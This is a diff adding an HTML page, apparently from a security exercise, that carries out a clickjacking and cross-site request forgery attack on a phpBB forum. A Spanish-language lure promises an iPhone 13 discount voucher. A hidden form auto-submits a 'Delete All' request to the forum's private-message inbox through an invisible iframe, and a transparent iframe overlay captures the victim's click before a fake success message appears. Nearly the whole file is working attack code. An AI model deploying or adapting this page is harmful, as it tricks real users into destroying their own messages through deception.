@@ -1,0 +1,203 @@
+<!-- First attack, two click clickjacking attack to delete all messages -->
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>Clickjacking</title>
+        <base href="/">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" type="image/x-icon" href="favicon.ico">
+        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
+        <script defer>
+            $(document).ready(function(){
+                var MyConfObj = {
+                    iframeMouseOver : false,
+                }
+                document.getElementById("form").submit();
+                document.getElementById("app2").style.display = "none";
+                const iframe = document.getElementById("iframe");
+                iframe.addEventListener('load',function(){
+                    if(MyConfObj.iframeMouseOver){
+                        document.getElementById("app1").style.display = "none";
+                        document.getElementById("app2").style.display = "block";
+                        MyConfObj.isEnd = true
+                    }
+                },true);
+                document.getElementById('iframe').addEventListener('mouseover', function(){
+                    MyConfObj.iframeMouseOver = true;
+                });
+                document.getElementById('iframe').addEventListener('mouseout', function(){
+                    MyConfObj.iframeMouseOver = false;
+                });
+            });
+        </script>      
+        <style>
+            .all {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100%;
+            }
+
+            .title {
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            font-size: 3rem;
+            margin-left: 100px;
+            text-align: center;
+            font-family: sans-serif;
+            color: #0066ff;
+            }
+
+            .iphone {
+            width: 350px;
+            position: absolute;
+            left: 140px;
+            top: 180px;
+            }
+
+            .content {
+            margin-left: 100px;
+            height: 80%;
+            width: 90%;
+            box-shadow: 5px 10px #888888;
+            background-color: white;
+            border-radius: 1rem;
+            }
+
+            .discount {
+            position: absolute;
+            width: 300px;
+            left: 350px;
+            top: 400px;
+            bottom: 150px;
+            }
+
+            .right-col {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-content: center;
+            justify-content: center;
+            align-items: center;
+            }
+
+            .original {
+            text-align: center;
+            font-size: 2.5rem;
+            }
+
+            .auth {
+            text-align: center;
+            font-size: 1rem;
+            color: #0066ff;
+            }
+
+            .text {
+                position: relative;
+                top: 100px;
+                left: 150px;
+                z-index: 1;
+            }
+            .frame-click{
+                position: absolute;
+                z-index: 2;
+                opacity: 0;
+                top: 200px;
+                right: -225px;
+                width: 100%;
+                height: 100%;
+            }
+            .top-div {
+                height: 440px;
+                width: 100%;
+                position: absolute;
+                background-color: transparent;
+                z-index: 3;
+                display: flex;
+                align-items: center;
+                color:darkblue;
+            }
+
+            .bottom-div {
+                width: 100%;
+                height: 230px;
+                position: absolute;
+                bottom: 0;
+                background-color: transparent;
+                z-index: 3;
+            }
+
+            .left-div {
+                width: 920px;
+                height: 100%;
+                position: absolute;
+                bottom: 0;
+                background-color: transparent;
+                z-index: 3;
+            }
+
+            .right-div {
+                width: 530px;
+                height: 100%;
+                position: absolute;
+                bottom: 0;
+                right: 0;
+                background-color: transparent;
+                z-index: 3;
+            }
+            .message{
+                display: flex;
+                width: 600px;
+                margin-left: 450px;
+            }
+        </style>
+    </head>
+    <body style="background-color: rgb(183, 224, 236);">
+        <div id="top" class="top-div"></div>
+        <div id="right" class="right-div"></div>
+        <div id="bottom" class="bottom-div"></div>
+        <div id="left" class="left-div"></div>
+        <div id="app1">
+            <div class="all">
+                <p class="title">
+                  ¡Felicidades! Has ganado el descuento de usuarios para la compra de un Iphone 13.
+                </p>
+                <div class="row content">
+                    <div class="col-4">
+                        <img class="iphone" src="iphone13.png">
+                        <img class="discount" src="descuento2.jpg">
+                    </div>
+                    <div class="text">
+                        <p class="original">
+                        Exclusivo para miembros de originalphpbb
+                        </p>
+                        <p class="message">
+                            Usted ha ganado un voucher de descuento para la compra de un Iphone 13, valido por el resto del año. Para reclamar su voucher, haga click:
+                        </p>
+                        <u  id="click" class="auth">
+                            <p class="auth">
+                            Aqui!
+                            </p>
+                        </u>
+                  </div>
+                </div>
+            </div>
+        </div>
+        <div id="app2">
+            <div class="all">
+                <div class="row content">
+                    <p class="title">
+                        Ya está! Recibira su voucher en la brevedad
+                        <img src="congratulations.jpg">
+                    </p>
+                </div>
+            </div>
+        </div>
+        <form id="form" target="iframe"
+            method="post" action="http://www.originalphpbb.com/privmsg.php?folder=inbox" >
+            <input type="hidden" name="msgdays" value="0" />
+            <input type="hidden" name="deleteall" value="Delete All" />
+        </form>
+        <iframe class="frame-click" name="iframe" id="iframe" src=""></iframe>
+    </body>
+</html>
